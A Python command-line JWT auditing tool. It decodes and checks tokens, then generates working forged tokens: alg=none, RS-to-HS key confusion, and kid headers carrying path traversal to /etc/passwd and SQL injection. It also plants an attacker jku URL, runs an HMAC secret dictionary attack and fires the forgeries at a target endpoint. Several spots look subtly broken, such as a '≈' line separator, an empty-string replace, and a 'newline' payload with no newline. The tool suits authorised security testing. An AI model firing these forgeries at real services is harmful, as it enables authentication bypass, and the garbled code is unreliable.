#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JWT Auditor - a command-line tool for comprehensive JWT security auditing.

Features
--------
1) Structural & semantic analysis
   - Decode Base64URL segments (header, payload, signature)
   - Pretty-print header and claims with risk highlights
   - Evaluate temporal claims (exp, nbf, iat) with optional leeway
   - Flag missing essential claims (iss, aud, sub, jti)
   - Heuristics for excessive TTL and dangerous roles/scopes

2) Cryptographic validation
   - HS256/384/512 (HMAC), RS256/384/512 (RSA), PS256/384/512 (RSA-PSS),
     ES256/384/512 (ECDSA), and EdDSA (Ed25519)
   - Load keys from: symmetric secret, PEM/DER public key, or remote JWKS
   - JWK to public key conversion; select by 'kid' when present

3) Vulnerability tests (controlled)
   - Attack mutations:
       * alg=none (signature removed)
       * RS->HS confusion (HMAC secret = public key PEM bytes)
       * 'kid' injection (path traversal, basic SQLi sample)
       * jku/x5u remote JWKS; embedded jwk in header
   - HS* dictionary attack (small built-in list or external wordlist)

4) Endpoint exerciser (optional)
   - Sends token (original and mutations) to a target endpoint
   - Reports HTTP status, body size, and potential improper acceptance

Ethical use only. Audit systems you are authorized to test.
"""

from __future__ import annotations
import argparse
import base64
from dataclasses import dataclass, field
from datetime import datetime, timezone, timedelta
import hashlib
import hmac
import json
import os
import re
import sys
from typing import Any, Dict, List, Optional, Tuple

__version__ = "1.1.0"

# Optional dependencies
try:
    import requests  # for JWKS fetch and HTTP exercising
except Exception:
    requests = None

try:
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import rsa, padding, ec, ed25519
    from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_der_public_key
    from cryptography.hazmat.primitives.asymmetric.utils import encode_dss_signature
    from cryptography.exceptions import InvalidSignature
except Exception:
    hashes = padding = rsa = ec = ed25519 = None
    load_pem_public_key = load_der_public_key = None
    encode_dss_signature = None
    InvalidSignature = Exception

# Algorithm maps
ALG_HS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
ALG_RS = {"RS256": hashes.SHA256 if hashes else None, "RS384": hashes.SHA384 if hashes else None, "RS512": hashes.SHA512 if hashes else None}
ALG_PS = {"PS256": hashes.SHA256 if hashes else None, "PS384": hashes.SHA384 if hashes else None, "PS512": hashes.SHA512 if hashes else None}
ALG_ES = {"ES256": hashes.SHA256 if hashes else None, "ES384": hashes.SHA384 if hashes else None, "ES512": hashes.SHA512 if hashes else None}
ALG_ED = {"EdDSA": "Ed25519"}

# Small embedded wordlist for HS*
COMMON_HS_WORDS = [
    "secret", "password", "changeme", "jwtsecret", "mysecret", "admin", "qwerty",
    "123456", "test", "dev", "prod", "stage", "default", "token", "supersecret",
]

@dataclass
class Finding:
    severity: str  # INFO | LOW | MEDIUM | HIGH | CRITICAL
    title: str
    detail: str

@dataclass
class AuditReport:
    header: Dict[str, Any] = field(default_factory=dict)
    payload: Dict[str, Any] = field(default_factory=dict)
    alg: str = "?"
    valid_b64: bool = True
    signature_present: bool = True
    signature_valid: Optional[bool] = None
    signature_detail: str = ""
    keys_considered: List[str] = field(default_factory=list)
    findings: List[Finding] = field(default_factory=list)

    def add(self, severity: str, title: str, detail: str) -> None:
        self.findings.append(Finding(severity, title, detail))

    def as_text(self) -> str:
        lines: List[str] = []
        lines.append("=" * 78)
        lines.append("JWT AUDIT REPORT")
        lines.append("=" * 78)
        lines.append(f"Algorithm: {self.alg}")
        lines.append(f"Signature present: {self.signature_present}")
        if self.signature_valid is not None:
            lines.append(f"Signature valid: {self.signature_valid}")
            if self.signature_detail:
                lines.append(self.signature_detail)
        if self.keys_considered:
            keys_line = ", ".join(self.keys_considered)
            lines.append("Keys considered: " + keys_line)
        lines.append("")
        lines.append("[Header]")
        lines.append(json.dumps(self.header, indent=2, ensure_ascii=False))
        lines.append("")
        lines.append("[Payload]")
        lines.append(json.dumps(self.payload, indent=2, ensure_ascii=False))
        lines.append("")
        lines.append("[Findings]")
        if not self.findings:
            lines.append("- No findings.")
        else:
            for f in self.findings:
                lines.append(f"- ({f.severity}) {f.title}: {f.detail}")
        return "≈".join(lines)

# Base64URL helpers

def b64url_decode(data: str) -> bytes:
    s = data.strip().replace("", "").replace(" ", "")
    rem = len(s) % 4
    if rem:
        s += "=" * (4 - rem)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")

# JWT parsing

def split_jwt(token: str) -> Tuple[str, str, str]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        if len(parts) == 2 and token.endswith("."):
            return parts[0], parts[1], ""
        raise ValueError("JWT must have three parts separated by dots.")
    return parts[0], parts[1], parts[2]


def parse_jwt(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], bytes, AuditReport]:
    rep = AuditReport()
    h_b64, p_b64, s_b64 = split_jwt(token)
    rep.signature_present = (s_b64 != "")

    try:
        header = json.loads(b64url_decode(h_b64))
    except Exception as e:
        rep.valid_b64 = False
        raise ValueError(f"Invalid header/Base64URL: {e}")
    try:
        payload = json.loads(b64url_decode(p_b64))
    except Exception as e:
        rep.valid_b64 = False
        raise ValueError(f"Invalid payload/Base64URL: {e}")
    try:
        signature = b64url_decode(s_b64) if s_b64 else b""
    except Exception as e:
        rep.valid_b64 = False
        raise ValueError(f"Invalid signature/Base64URL: {e}")

    rep.header = header
    rep.payload = payload
    rep.alg = str(header.get("alg", "?"))
    return header, payload, signature, rep

# Signing input

def _signing_input(token: str) -> bytes:
    h, p, _ = split_jwt(token)
    return (h + "." + p).encode("ascii")

# HS* verification

def verify_hs(token: str, alg: str, secret: bytes, signature: bytes) -> bool:
    func = ALG_HS[alg]
    mac = hmac.new(secret, _signing_input(token), func)
    expected = mac.digest()
    return hmac.compare_digest(expected, signature)

# PEM/DER public key loader

def _load_public_key_pem(pem_path: str):
    if load_pem_public_key is None:
        raise RuntimeError("cryptography not available for asymmetric keys")
    with open(pem_path, "rb") as f:
        data = f.read()
    try:
        return load_pem_public_key(data), data
    except Exception:
        try:
            return load_der_public_key(data), data
        except Exception as e:
            raise ValueError(f"Failed to load public key: {e}")

# RSA/PS verification

def verify_rs_ps(token: str, alg: str, pubkey, signature: bytes) -> bool:
    if rsa is None:
        raise RuntimeError("cryptography not available for RSA/PSS")
    hash_obj = {
        "RS256": ALG_RS["RS256"](), "RS384": ALG_RS["RS384"](), "RS512": ALG_RS["RS512"](),
        "PS256": ALG_PS["PS256"](), "PS384": ALG_PS["PS384"](), "PS512": ALG_PS["PS512"](),}[alg]
    pad = padding.PKCS1v15() if alg.startswith("RS") else padding.PSS(mgf=padding.MGF1(hash_obj), salt_length=padding.PSS.MAX_LENGTH)
    try:
        pubkey.verify(signature, _signing_input(token), pad, hash_obj)
        return True
    except InvalidSignature:
        return False

# ECDSA JWS raw R||S to DER

def _ecdsa_raw_to_der(sig: bytes) -> bytes:
    if encode_dss_signature is None:
        raise RuntimeError("cryptography missing encode_dss_signature util")
    half = len(sig) // 2
    r = int.from_bytes(sig[:half], "big")
    s = int.from_bytes(sig[half:], "big")
    return encode_dss_signature(r, s)

# ES* verification

def verify_es(token: str, alg: str, pubkey, signature: bytes) -> bool:
    if ec is None:
        raise RuntimeError("cryptography not available for ECDSA")
    der = _ecdsa_raw_to_der(signature)
    hash_obj = {"ES256": ALG_ES["ES256"](), "ES384": ALG_ES["ES384"](), "ES512": ALG_ES["ES512"]()}[alg]
    try:
        pubkey.verify(der, _signing_input(token), ec.ECDSA(hash_obj))
        return True
    except InvalidSignature:
        return False

# Ed25519 verification

def verify_eddsa(token: str, pubkey, signature: bytes) -> bool:
    if ed25519 is None:
        raise RuntimeError("cryptography not available for Ed25519")
    try:
        pubkey.verify(signature, _signing_input(token))
        return True
    except InvalidSignature:
        return False

# JWK/JWKS helpers

def _b64u_to_int(s: str) -> int:
    return int.from_bytes(b64url_decode(s), "big")


def jwk_to_public_key(jwk: Dict[str, Any]):
    if rsa is None and ec is None and ed25519 is None:
        raise RuntimeError("cryptography not available for JWK conversion")
    kty = jwk.get("kty")
    if kty == "RSA":
        n = _b64u_to_int(jwk["n"])  # modulus
        e = _b64u_to_int(jwk["e"])  # exponent
        pub_numbers = rsa.RSAPublicNumbers(e, n)
        return pub_numbers.public_key()
    if kty == "EC":
        crv = jwk.get("crv")
        x = int.from_bytes(b64url_decode(jwk["x"]), "big")
        y = int.from_bytes(b64url_decode(jwk["y"]), "big")
        curve = {"P-256": ec.SECP256R1(), "P-384": ec.SECP384R1(), "P-521": ec.SECP521R1()}[crv]
        pub_numbers = ec.EllipticCurvePublicNumbers(x, y, curve)
        return pub_numbers.public_key()
    if kty == "OKP" and jwk.get("crv") == "Ed25519":
        return ed25519.Ed25519PublicKey.from_public_bytes(b64url_decode(jwk["x"]))
    raise ValueError("Unsupported JWK")


def fetch_jwks(jwks_url: str) -> Dict[str, Any]:
    if requests is None:
        raise RuntimeError("requests not available to fetch JWKS")
    resp = requests.get(jwks_url, timeout=10)
    resp.raise_for_status()
    data = resp.json()
    if "keys" not in data:
        raise ValueError("Invalid JWKS (missing 'keys')")
    return data


def pick_jwk_for_kid(jwks: Dict[str, Any], kid: Optional[str]):
    keys = jwks.get("keys", [])
    if kid is None and keys:
        return keys[0]
    for k in keys:
        if k.get("kid") == kid:
            return k
    return None

# Heuristics & security checks

def analyze_claims(rep: AuditReport, now: Optional[datetime] = None, leeway_sec: int = 0) -> None:
    header, payload = rep.header, rep.payload

    # Header checks
    if header.get("alg") == "none":
        rep.add("CRITICAL", "alg=none in header", "Backend may accept unsigned tokens if misconfigured.")
    if "kid" in header:
        rep.add("INFO", "'kid' present", "Ensure key loading is safe (no path traversal / SQLi).")
    if "jku" in header or "x5u" in header:
        rep.add("HIGH", "Remote jku/x5u", "Backend may fetch keys from remote URLs (SSRF/trust risk).")
    if "jwk" in header:
        rep.add("HIGH", "Embedded jwk in header", "If backend trusts it, attacker may enforce their own key.")
    if header.get("crit"):
        rep.add("INFO", "'crit' header present", f"crit={header.get('crit')}")

    # Temporal claims
    now = now or datetime.now(timezone.utc)

    def _to_dt(ts):
        if ts is None:
            return None
        try:
            return datetime.fromtimestamp(float(ts), tz=timezone.utc)
        except Exception:
            return None

    exp = _to_dt(payload.get("exp"))
    nbf = _to_dt(payload.get("nbf"))
    iat = _to_dt(payload.get("iat"))

    if exp is None:
        rep.add("HIGH", "Missing 'exp'", "Token without expiration enables abuse and replay.")
    else:
        if exp + timedelta(seconds=leeway_sec) < now:
            rep.add("HIGH", "Expired token", f"exp={exp.isoformat()} is in the past. Check backend acceptance.")
    if nbf and nbf - timedelta(seconds=leeway_sec) > now:
        rep.add("MEDIUM", "Not yet valid (nbf)", f"nbf={nbf.isoformat()} is in the future.")
    if iat and iat - timedelta(seconds=leeway_sec) > now:
        rep.add("LOW", "'iat' in the future", f"iat={iat.isoformat()}")

    if exp and iat:
        ttl = (exp - iat).total_seconds()
        if ttl > 60 * 60 * 24 * 7:  # > 7 days
            days = ttl / 86400.0
            rep.add("MEDIUM", "Excessive TTL", f"Validity is {days:.1f} days. Consider reducing.")

    for claim in ("iss", "aud", "sub"):
        if claim not in payload:
            rep.add("LOW", f"Missing '{claim}'", "Add for stronger backend validation.")

    if "jti" not in payload:
        rep.add("LOW", "Missing 'jti' (nonce)", "Without a unique ID, replay mitigation is harder.")

    # Permission heuristics
    for key in ("role", "roles", "scope", "permissions"):
        if key in payload:
            val = payload[key]
            val_str = ",".join(map(str, val)) if isinstance(val, (list, tuple, set)) else str(val)
            rep.add("INFO", f"Sensitive claim: {key}", f"Value: {val_str}")
            if re.search(r"admin|\*|all|root|super", val_str, re.I):
                rep.add("HIGH", f"{key} potentially excessive", f"Value shows elevated privileges: {val_str}")

    # 'typ' should be JWT or omitted
    typ = header.get("typ")
    if typ and str(typ).upper() not in {"JWT", "JOSE"}:
        rep.add("LOW", "Unusual 'typ'", f"typ={typ}")

# Attack mutations

def mutate_alg_none(token: str) -> str:
    h_b64, p_b64, _ = split_jwt(token)
    try:
        h = json.loads(b64url_decode(h_b64))
    except Exception:
        return token
    h["alg"] = "none"
    new_h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")).encode("utf-8"))
    return f"{new_h_b64}.{p_b64}."


def mutate_rs_to_hs_confusion(token: str, public_key_pem_bytes: bytes) -> Optional[str]:
    h_b64, p_b64, _ = split_jwt(token)
    try:
        h = json.loads(b64url_decode(h_b64))
    except Exception:
        return None
    h["alg"] = "HS256"
    new_h_b64 = b64url_encode(json.dumps(h, separators=(",", ":")).encode("utf-8"))
    signing = f"{new_h_b64}.{p_b64}".encode("ascii")
    mac = hmac.new(public_key_pem_bytes, signing, hashlib.sha256).digest()
    sig_b64 = b64url_encode(mac)
    return f"{new_h_b64}.{p_b64}.{sig_b64}"


def mutate_kid_injection(token: str) -> List[Tuple[str, str]]:
    h_b64, p_b64, s_b64 = split_jwt(token)
    try:
        h = json.loads(b64url_decode(h_b64))
    except Exception:
        return []
    variants: List[Tuple[str, str]] = []
    payload_map = {
        "../../../../../../etc/passwd": "traversal_unix",
        "..\..\..\..\windows\win.ini": "traversal_win",
        "abc' UNION SELECT 'secret' -- ": "sqli",
        "abcxyz": "newline",}
    for kid_val, tag in payload_map.items():
        h2 = dict(h)
        h2["kid"] = kid_val
        new_h_b64 = b64url_encode(json.dumps(h2, separators=(",", ":")).encode("utf-8"))
        variants.append((f"kid_{tag}", f"{new_h_b64}.{p_b64}.{s_b64}"))
    return variants


def mutate_jku_jwk(token: str, attacker_jwks_url: str, attacker_jwk: Optional[Dict[str, Any]] = None) -> str:
    h_b64, p_b64, s_b64 = split_jwt(token)
    h = json.loads(b64url_decode(h_b64))
    h2 = dict(h)
    h2["jku"] = attacker_jwks_url
    if attacker_jwk:
        h2["jwk"] = attacker_jwk
    new_h_b64 = b64url_encode(json.dumps(h2, separators=(",", ":")).encode("utf-8"))
    return f"{new_h_b64}.{p_b64}.{s_b64}"

# HS* dictionary attack

def hs_dictionary_attack(token: str, alg: str, signature: bytes, words: List[str]) -> Optional[str]:
    for w in words:
        if verify_hs(token, alg, w.encode("utf-8"), signature):
            return w
    return None

# Signature verification orchestrator

def verify_signature(rep: AuditReport, token: str, signature: bytes,
                     secret: Optional[str] = None,
                     pubkey_path: Optional[str] = None,
                     jwks_url: Optional[str] = None,
                     prefer_kid: bool = True) -> None:
    alg = rep.alg

    if alg == "none":
        rep.signature_valid = (signature == b"" and not rep.signature_present)
        rep.signature_detail = "alg=none: signature suppressed"
        return

    if alg in ALG_HS:
        if not secret:
            rep.signature_valid = None
            rep.signature_detail = "Provide --secret (or dictionary attack) for HS*"
            return
        ok = verify_hs(token, alg, secret.encode("utf-8"), signature)
        rep.signature_valid = ok
        rep.signature_detail = f"HS* verified with provided secret ({len(secret)} bytes)"
        return

    pub_obj = None
    pem_bytes = None
    if pubkey_path:
        try:
            pub_obj, pem_bytes = _load_public_key_pem(pubkey_path)
            rep.keys_considered.append(f"PEM:{os.path.basename(pubkey_path)}")
        except Exception as e:
            rep.add("LOW", "Public key load failure", str(e))

    if jwks_url:
        try:
            jwks = fetch_jwks(jwks_url)
            jwk = pick_jwk_for_kid(jwks, rep.header.get("kid") if prefer_kid else None)
            if jwk:
                pub_obj = jwk_to_public_key(jwk)
                rep.keys_considered.append(f"JWKS:{jwks_url} kid={jwk.get('kid')}")
            else:
                rep.add("LOW", "kid not found in JWKS", f"kid={rep.header.get('kid')} in {jwks_url}")
        except Exception as e:
            rep.add("LOW", "Failed to fetch/parse JWKS", str(e))

    if pub_obj is None:
        rep.signature_valid = None
        rep.signature_detail = "No public key available (use --pubkey or --jwks)"
        return

    try:
        if alg in ALG_RS or alg in ALG_PS:
            rep.signature_valid = verify_rs_ps(token, alg, pub_obj, signature)
        elif alg in ALG_ES:
            rep.signature_valid = verify_es(token, alg, pub_obj, signature)
        elif alg in ALG_ED:
            rep.signature_valid = verify_eddsa(token, pub_obj, signature)
        else:
            rep.signature_valid = None
            rep.signature_detail = f"Algorithm {alg} not supported for verification"
            return
        rep.signature_detail = f"{alg} verification with public key"
    except Exception as e:
        rep.signature_valid = None
        rep.signature_detail = f"Verification error: {e}"

# Endpoint exerciser

def exercise_endpoint(url: str, token: str, header_name: str = "Authorization", header_fmt: str = "Bearer {token}", method: str = "GET") -> Tuple[int, int, str]:
    if requests is None:
        raise RuntimeError("requests not available to exercise endpoint")
    headers = {header_name: header_fmt.format(token=token)}
    resp = requests.request(method.upper(), url, headers=headers, timeout=10)
    return resp.status_code, len(resp.content), resp.headers.get("content-type", "")

# CLI command

def cmd_analyze(args) -> None:
    header, payload, signature, rep = parse_jwt(args.token)
    analyze_claims(rep, leeway_sec=args.leeway)

    if args.verify:
        verify_signature(rep, args.token, signature,
                         secret=args.secret,
                         pubkey_path=args.pubkey,
                         jwks_url=args.jwks)

        if rep.alg in ALG_HS and rep.signature_valid is False and (args.wordlist or args.small_dict):
            words: List[str] = []
            if args.small_dict:
                words.extend(COMMON_HS_WORDS)
            if args.wordlist:
                try:
                    with open(args.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                        words.extend([line.strip() for line in f if line.strip()])
                except Exception as e:
                    rep.add("LOW", "Failed to read wordlist", str(e))
            hit = hs_dictionary_attack(args.token, rep.alg, signature, words)
            if hit:
                rep.add("CRITICAL", "Weak HS* secret discovered", f"Secret found via dictionary: '{hit}'")
            else:
                rep.add("INFO", "Dictionary attack had no success", f"Tested {len(words)} words.")

    print(rep.as_text())

    if args.target:
        if requests is None:
            print("[!] 'requests' is not available; cannot test endpoint.")
        else:
            print("Exercising target endpoint with ORIGINAL token...")
            try:
                code, size, ctype = exercise_endpoint(args.target, args.token, args.header_name, args.header_fmt, args.method)
                print(f"-> {args.method} {args.target} | HTTP {code} | {size} bytes | {ctype}")
            except Exception as e:
                print(f"Request failed: {e}")

    if args.mutate:
        out = args.out or os.getcwd()
        os.makedirs(out, exist_ok=True)
        count = 0

        m = mutate_alg_none(args.token)
        with open(os.path.join(out, "mut_none.txt"), "w", encoding="utf-8") as f:
            f.write(m)
        count += 1

        if args.pubkey:
            try:
                _, pem_bytes = _load_public_key_pem(args.pubkey)
                c = mutate_rs_to_hs_confusion(args.token, pem_bytes)
                if c:
                    with open(os.path.join(out, "mut_rs2hs.txt"), "w", encoding="utf-8") as f:
                        f.write(c)
                    count += 1
            except Exception:
                pass

        for tag, tok in mutate_kid_injection(args.token):
            with open(os.path.join(out, f"mut_{tag}.txt"), "w", encoding="utf-8") as f:
                f.write(tok)
            count += 1

        if args.attacker_jwks:
            tok = mutate_jku_jwk(args.token, args.attacker_jwks)
            with open(os.path.join(out, "mut_jku.txt"), "w", encoding="utf-8") as f:
                f.write(tok)
            count += 1

        print(f"[+] {count} mutations saved to: {out}")

        if args.target and requests is not None:
            print("Exercising endpoint with mutations...")
            for name in sorted(os.listdir(out)):
                if not name.startswith("mut_"):
                    continue
                with open(os.path.join(out, name), "r", encoding="utf-8") as f:
                    tok = f.read().strip()
                try:
                    code, size, ctype = exercise_endpoint(args.target, tok, args.header_name, args.header_fmt, args.method)
                    ok = 200 <= code < 400
                    status = "POTENTIAL ACCEPTANCE" if ok else "rejected"
                    print(f"- {name}: HTTP {code} ({status}), {size} bytes, {ctype}")
                except Exception as e:
                    print(f"- {name}: request failed ({e})")

# Argument parser

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="Complete JWT audit: analysis, signature verification, attack mutations, endpoint testing",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("token", help="JWT in compact form (header.payload.signature)")

    # Verification / Keys
    p.add_argument("--verify", action="store_true", help="Verify the signature")
    p.add_argument("--secret", help="Symmetric secret for HS*")
    p.add_argument("--pubkey", help="Path to public key (PEM/DER) for RS/PS/ES/EdDSA")
    p.add_argument("--jwks", help="JWKS URL to fetch public keys")
    p.add_argument("--leeway", type=int, default=0, help="Leeway (seconds) for temporal claims")

    # HS* dictionary attack
    p.add_argument("--small-dict", action="store_true", help="Try a tiny built-in HS* wordlist")
    p.add_argument("--wordlist", help="Path to wordlist for HS* (one secret per line)")

    # Mutations
    p.add_argument("--mutate", action="store_true", help="Generate attack mutations for the token")
    p.add_argument("--out", help="Output directory for mutations")
    p.add_argument("--attacker-jwks", help="Your public JWKS URL to test jku (e.g., http://127.0.0.1:8000/jwks.json)")

    # Endpoint
    p.add_argument("--target", help="Protected endpoint URL to test token acceptance")
    p.add_argument("--method", default="GET", help="HTTP method (GET/POST/...)")
    p.add_argument("--header-name", default="Authorization", help="Header name used to send the token")
    p.add_argument("--header-fmt", default="Bearer {token}", help="Header value format (use {token})")

    return p

# Main

def main(argv: Optional[List[str]] = None) -> None:
    argv = argv or sys.argv[1:]
    args = build_parser().parse_args(argv)
    try:
        cmd_analyze(args)
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(2)

if __name__ == "__main__":
    main()

